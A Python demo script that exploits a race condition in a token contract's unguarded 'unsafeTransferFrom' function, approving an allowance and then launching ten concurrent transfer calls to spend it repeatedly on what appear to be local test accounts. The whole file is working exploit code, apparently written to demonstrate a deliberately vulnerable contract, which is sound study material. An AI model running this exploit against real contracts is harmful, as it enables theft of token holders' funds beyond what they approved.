"""Demo: exploit the unguarded `unsafeTransferFrom` via a transferFrom race
condition, using 10 concurrent threads against the same allowance (formerly
test.py).
"""

import threading

from chain import get_web3, load_contract


def main():
    web3 = get_web3()
    contract = load_contract(web3)

    sender, attacker, recipient = web3.eth.accounts[0], web3.eth.accounts[1], web3.eth.accounts[2]
    amount = 100

    print(f"Decimals of MyToken: {contract.functions.decimals().call()}")

    tx_hash = contract.functions.approve(attacker, amount).transact({"from": sender})
    web3.eth.wait_for_transaction_receipt(tx_hash)

    def unsafe_transfer_from_attacker():
        try:
            tx_hash = contract.functions.unsafeTransferFrom(sender, recipient, amount).transact({"from": attacker})
            web3.eth.wait_for_transaction_receipt(tx_hash)
            print("Attacker transfer successful!")
        except Exception as exc:
            print(f"Attacker transfer failed: {exc}")

    threads = [threading.Thread(target=unsafe_transfer_from_attacker) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    print(f"Sender's balance: {contract.functions.balanceOf(sender).call()}")
    print(f"Attacker's balance: {contract.functions.balanceOf(attacker).call()}")
    print(f"Recipient's balance: {contract.functions.balanceOf(recipient).call()}")


if __name__ == "__main__":
    main()
